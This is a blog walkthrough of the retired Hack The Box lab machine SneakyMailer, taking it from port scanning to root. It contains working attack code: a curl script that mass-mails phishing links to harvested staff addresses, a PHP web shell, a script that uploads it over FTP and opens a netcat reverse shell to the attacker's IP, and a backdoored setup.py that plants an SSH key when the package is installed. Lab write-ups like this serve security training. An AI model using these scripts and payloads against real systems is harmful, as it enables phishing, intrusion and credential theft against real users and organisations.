---
layout: post  
title: "SneakyMailer: Hack The Box Walkthrough"
date: 2020-12-03 08:20:49 +0000
last_modified_at: 2020-12-03 08:20:49 +0000
category: Walkthrough
tags: ["Hack The Box", SneakyMailer, retired, Linux, Medium]
comments: true
protect: false
image:
  feature: sneakymailer-htb-walkthrough.png
---

This post documents the complete walkthrough of SneakyMailer, a retired vulnerable [VM][1] created by [sulcud][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

SneakyMailer is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.197 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-07-13 16:05:40 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.197
Discovered open port 993/tcp on 10.10.10.197
Discovered open port 25/tcp on 10.10.10.197
Discovered open port 80/tcp on 10.10.10.197
Discovered open port 22/tcp on 10.10.10.197
Discovered open port 21/tcp on 10.10.10.197
Discovered open port 143/tcp on 10.10.10.197
```

Wow, plenty of open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p21,22,25,80,143,993,8080 -A --reason 10.10.10.197 -oN nmap.txt
...
PORT     STATE SERVICE  REASON         VERSION
21/tcp   open  ftp      syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     syn-ack ttl 63 Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     syn-ack ttl 63 nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     syn-ack ttl 63 Courier Imapd (released 2018)
|_imap-capabilities: IMAP4rev1 completed QUOTA UIDPLUS ENABLE THREAD=REFERENCES UTF8=ACCEPTA0001 NAMESPACE CHILDREN IDLE ACL CAPABILITY STARTTLS OK THREAD=ORDEREDSUBJECT ACL2=UNION SORT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap syn-ack ttl 63 Courier Imapd (released 2018)
|_imap-capabilities: IMAP4rev1 completed QUOTA UIDPLUS ENABLE THREAD=REFERENCES UTF8=ACCEPTA0001 NAMESPACE CHILDREN IDLE ACL CAPABILITY OK THREAD=ORDEREDSUBJECT SORT AUTH=PLAIN ACL2=UNION
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     syn-ack ttl 63 nginx 1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
```

Not much going on if I'm being totally honest. I'd better put `sneakycorp.htb` into `/etc/hosts`. Here's what it looks like.

{% include image.html image_alt="c7a41d9e.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/c7a41d9e.png" %}

### Avengers Assemble

On the sidebar, there's a page `team.php` that lists all the employees of Sneaky Corp. It was trivial to retrieve the email address from the table using a combination of commandline-fu and JavaScript.

```
tigernixon@sneakymailer.htb
garrettwinters@sneakymailer.htb
ashtoncox@sneakymailer.htb
cedrickelly@sneakymailer.htb
airisatou@sneakymailer.htb
briellewilliamson@sneakymailer.htb
herrodchandler@sneakymailer.htb
rhonadavidson@sneakymailer.htb
colleenhurst@sneakymailer.htb
sonyafrost@sneakymailer.htb
jenagaines@sneakymailer.htb
quinnflynn@sneakymailer.htb
chardemarshall@sneakymailer.htb
haleykennedy@sneakymailer.htb
tatyanafitzpatrick@sneakymailer.htb
michaelsilva@sneakymailer.htb
paulbyrd@sneakymailer.htb
glorialittle@sneakymailer.htb
bradleygreer@sneakymailer.htb
dairios@sneakymailer.htb
jenettecaldwell@sneakymailer.htb
yuriberry@sneakymailer.htb
caesarvance@sneakymailer.htb
doriswilder@sneakymailer.htb
angelicaramos@sneakymailer.htb
gavinjoyce@sneakymailer.htb
jenniferchang@sneakymailer.htb
brendenwagner@sneakymailer.htb
fionagreen@sneakymailer.htb
shouitou@sneakymailer.htb
michellehouse@sneakymailer.htb
sukiburks@sneakymailer.htb
prescottbartlett@sneakymailer.htb
gavincortez@sneakymailer.htb
martenamccray@sneakymailer.htb
unitybutler@sneakymailer.htb
howardhatfield@sneakymailer.htb
hopefuentes@sneakymailer.htb
vivianharrell@sneakymailer.htb
timothymooney@sneakymailer.htb
jacksonbradshaw@sneakymailer.htb
olivialiang@sneakymailer.htb
brunonash@sneakymailer.htb
sakurayamamoto@sneakymailer.htb
thorwalton@sneakymailer.htb
finncamacho@sneakymailer.htb
sergebaldwin@sneakymailer.htb
zenaidafrank@sneakymailer.htb
zoritaserrano@sneakymailer.htb
jenniferacosta@sneakymailer.htb
carastevens@sneakymailer.htb
hermionebutler@sneakymailer.htb
laelgreer@sneakymailer.htb
jonasalexander@sneakymailer.htb
shaddecker@sneakymailer.htb
sulcud@sneakymailer.htb
donnasnider@sneakymailer.htb
```

The email domain is `sneakymailer.htb`. I'd better include it in `/etc/hosts` as well.

### Missing Registration Page

There's a comment in the HTML source code that points to the registration page.

{% include image.html image_alt="6963e72d.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/6963e72d.png" %}

Here's what the registration page looks like.

{% include image.html image_alt="2124b042.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/2124b042.png" %}

If I'd to guess and going by the information that work has been allocated and someone is supposed to check their inbox for instructions how to register, I'd say that this is some kind of client-side attack, i.e. send a phishing email to bait someone to register.

### Phishing Attack

Since I have 57 email addresses to phish, I need an efficient way to spam. With that in mind, I wrote a simple `bash` script, driven by `curl`. Yes, `curl` can send email too!

<div class="filename"><span>send.sh</span></div>

```bash
#!/bin/bash

HOST=sneakymailer.htb
TEMP=$(mktemp -u)
RCPT=$1

cat <<EOF >> $TEMP
From: sulcud@sneakymailer.htb
To: $RCPT
Subject: Urgent - PyPI Registration
Date: `date`

http://10.10.16.23/register.php

Regards,
Biggus Dickus

EOF

curl -s "smtp://$HOST" --mail-from "sulcud@sneakymailer.htb" --mail-rcpt "$RCPT" --upload-file "$TEMP"

# clean up
rm -rf $TEMP
```

On my attacking machine, I'll set up a Python HTTP server and Wireshark to observe. The script works well with GNU Parallel to send the multiple phishing emails in parallel.

{% include image.html image_alt="50d33ed7.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/50d33ed7.png" %}

See what do we have here.

{% include image.html image_alt="a8ff52b6.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/a8ff52b6.png" %}

Someone by the name of Paul Bryd has decided to take the bait and register himself but boy, is the password wicked.

### IMAP with `curl`

Armed with the credential, let's see what we can find out from IMAP. Yes, `curl` does IMAP too!

#### Listing folders

```
# curl "imap://paulbyrd:%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt@sneakymailer.htb/" -X 'LIST "" "*"'
* LIST (\Unmarked \HasChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX.Trash"
* LIST (\HasNoChildren) "." "INBOX.Sent"
* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
* LIST (\HasNoChildren) "." "INBOX.Sent Items"
```

#### Examining folders

Long story short. The only folder that has something in it is **Inbox.Sent Items**.

```
# curl "imap://paulbyrd:%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt@sneakymailer.htb/" -X 'EXAMINE "INBOX.Sent Items"'
* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
* OK [PERMANENTFLAGS ()] No permanent flags permitted
* 2 EXISTS
* 0 RECENT
* OK [UIDVALIDITY 589480766] Ok
* OK [MYRIGHTS "acdilrsw"] ACL
```

OK. There are 2 items in the folder.

#### Retrieving items

```
# curl "imap://paulbyrd:%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt@sneakymailer.htb/INBOX.Sent%20Items/;UID=*"
To: low@debian
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Module testing
Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>
Date: Wed, 27 May 2020 13:28:58 -0400
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.8.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Content-Language: en-US

Hello low


Your current task is to install, test and then erase every python module you
find in our PyPI service, let me know if you have any inconvenience.

```

Hmm. That's only one item. What about the other?

```
[+] Fetching 61...
MIME-Version: 1.0
To: root <root@debian>
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Password reset
Date: Fri, 15 May 2020 13:03:37 -0500
Importance: normal
X-Priority: 3
Content-Type: multipart/alternative;
        boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain; charset="utf-8"

Hello administrator, I want to change this password for the developer accou=
nt

Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C

Please notify me when you do it=20

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
Content-Transfer-Encoding: quoted-printable
Content-Type: text/html; charset="utf-8"

<html xmlns:o=3D"urn:schemas-microsoft-com:office:office" xmlns:w=3D"urn:sc=
hemas-microsoft-com:office:word" xmlns:m=3D"http://schemas.microsoft.com/of=
fice/2004/12/omml" xmlns=3D"http://www.w3.org/TR/REC-html40"><head><meta ht=
tp-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8"><meta name=
=3DGenerator content=3D"Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
.MsoChpDefault
        {mso-style-type:export-only;}
@page WordSection1
        {size:8.5in 11.0in;
        margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
        {page:WordSection1;}
--></style></head><body lang=3DEN-US link=3Dblue vlink=3D"#954F72"><div cla=
ss=3DWordSection1><p class=3DMsoNormal>Hello administrator, I want to chang=
e this password for the developer account</p><p class=3DMsoNormal><o:p>&nbs=
p;</o:p></p><p class=3DMsoNormal>Username: developer</p><p class=3DMsoNorma=
l>Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</p><p class=3DMsoNorm=
al><o:p>&nbsp;</o:p></p><p class=3DMsoNormal>Please notify me when you do i=
t </p></div></body></html>=

--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--

[+] Fetching 63...
To: low@debian
From: Paul Byrd <paulbyrd@sneakymailer.htb>
Subject: Module testing
Message-ID: <4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb>
Date: Wed, 27 May 2020 13:28:58 -0400
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.8.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Content-Language: en-US

Hello low


Your current task is to install, test and then erase every python module you
find in our PyPI service, let me know if you have any inconvenience.

```

One has UID 61, the other had UID 63. Sneaky bastard.

### FTP Service

Armed with the `developer` credential, let's see if we can explore the FTP service. Looks like `developer` is the only account allowed to log in to the FTP service.

{% include image.html image_alt="a5661ba5.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/a5661ba5.png" %}

The content of the directory looks strangely familiar.

{% include image.html image_alt="e30e5fb3.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/e30e5fb3.png" %}

Perhaps there's another subdomain or vhost `dev.sneakycorp.htb`?

{% include image.html image_alt="3bc114d6.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/3bc114d6.png" %}

Indeed. And look at the sidebar; the link to the Registration page is there!

## Foothold

Time to see if `developer` can plant a web shell or PHP backdoor!

<div class="filename"><span>cmd.php</span></div>

```
<?php echo shell_exec($_GET[0]); ?>
```

{% include image.html image_alt="be8e5a80.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/be8e5a80.png" %}

Awesome but the file gets deleted in an instant. I need an automated way.

<div class="filename"><span>shell.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.197
LHOST=10.10.16.23
LPORT=80
USER=developer
PASS='m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C'
CMD="rm /tmp/p; mknod /tmp/p p; /bin/bash </tmp/p | /bin/nc $LHOST $LPORT >/tmp/p"

cat <<EOF >cmd.php
<?php echo shell_exec('$CMD'); ?>
EOF

curl -s -T cmd.php "ftp://${USER}:$(urlencode ${PASS})@${HOST}/dev/"
curl -m 3 "http://dev.sneakycorp.htb/cmd.php" 2>/dev/null
```

Run the script and you should get a shell at your `nc` listener.

{% include image.html image_alt="18aae6dd.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/18aae6dd.png" %}

### Where is this PyPI service located at?

The PyPI respository is essentially hosted out of a HTTP web server. The other `http` service being `8080/tcp` is likely the one. This is what it looks at `http://10.10.10.197:8080`.

{% include image.html image_alt="bed22826.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/bed22826.png" %}

This tells me that some kind of virtual host or subdomain exists. We have two domains: `sneakycorp.htb` and `sneakymailer.htb` and since we are looking for the PyPI service, let's check out the nginx configuration.

```
$ cat /etc/nginx/sites-available/pypi.sneakycorp.htb
server {
        listen 0.0.0.0:8080 default_server;
        listen [::]:8080 default_server;
        server_name _;
}


server {
        listen 0.0.0.0:8080;
        listen [::]:8080;

        server_name pypi.sneakycorp.htb;

        location / {
                proxy_pass http://127.0.0.1:5000;
                proxy_set_header Host $host;
                proxy_set_header X-Real-IP $remote_addr;
        }
}
```

Yes, that looks about right. While we are at it, let's check out the process.

```
$ ps auxw | grep pypi
pypi       716  0.0  0.6  36796 25720 ?        Ss   03:37   0:01 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --disable-fallback -o /var/www/pypi.sneakycorp.htb/packages
```

Here's what it looks like.

{% include image.html image_alt="fae3fb3e.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/fae3fb3e.png" %}

### PyPI Repository

Recall the email addressed to `low@debian`, with the task to install, test and erase Python modules found in the PyPI service? I'd say this is the cue to upload a malicious Python package. To do, we need credentials from in `/var/www/pypi.sneakycorp.htb/.htpasswd`.

{% include image.html image_alt="b5814f32.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/b5814f32.png" %}

Here's the plan:

1) Create a SSH public key I control and write it `/home/low/.ssh/authorized_keys`. You know why? Because `low` is the only user allowed to use SSH.


{% include image.html image_alt="463a10aa.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/463a10aa.png" %}


2) Upload the package remotely with `setuptools`. I'd have prefer to use `scp` over remote upload but `low` is a member of the `pypi-pkg` group and I still don't have access to this account yet.


{% include image.html image_alt="5cff4b1b.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/5cff4b1b.png" %}


All the instructions to do the above can be found [here](https://pypi.org/project/pypiserver/) and [here](https://packaging.python.org/tutorials/packaging-projects/).

#### Upload a malicious Python backdoor package

According to the instructions, we need two files, i.e. `.pypirc` and `setup.py`.

<div class="filename"><span>.pypirc</span></div>

```
[distutils]
index-servers =
  local

[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

<div class="filename"><span>setup.py</span></div>

```python
import setuptools

sshpub = "ssh-rsa AAAAB3N...7aaFJ2S8="

try:
    with open("/home/low/.ssh/authorized_keys", "a") as fh:
        fh.write(sshpub)
        fh.close()
except Exception:
    pass

setuptools.setup(
    name="example-pkg-dipshit",
    version="0.0.1",
    author="Example Author",
    author_email="author@example.com",
    description="A small example package",
    long_description="",
    long_description_content_type="text/markdown",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
```

Take note of the `try...except` clause in `setup.py` above. Without that, we wouldn't be able to upload the package because `/home/low/.ssh/authorized_keys` doesn't exists on my attacking machine.

{% include image.html image_alt="76f2f17c.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/76f2f17c.png" %}

Bombs away. Let's see if I can log in as `low`.

{% include image.html image_alt="ff37d12c.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/ff37d12c.png" %}

Sweet. Not surprisingly, `user.txt` at low's home directory.

{% include image.html image_alt="b8df81d5.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/b8df81d5.png" %}

## Privilege Escalation

During enumeration of `low`'s account, I noticed that `low` is able to `sudo` as `root` with the following command.

{% include image.html image_alt="82033ce6.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/82033ce6.png" %}

### GTFOBins

Check out this `pip` [entry](https://gtfobins.github.io/gtfobins/pip/) in GTFBins. Exactly what I need.

{% include image.html image_alt="3ea7feae.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/3ea7feae.png" %}

Getting `root.txt` with a root shell is trivial.

{% include image.html image_alt="fcaad08b.png" image_src="/f6d69e00-f868-46b9-95db-9ecf8f2ea495/fcaad08b.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/262
[2]: https://www.hackthebox.eu/home/users/profile/106709
[3]: https://www.hackthebox.eu/
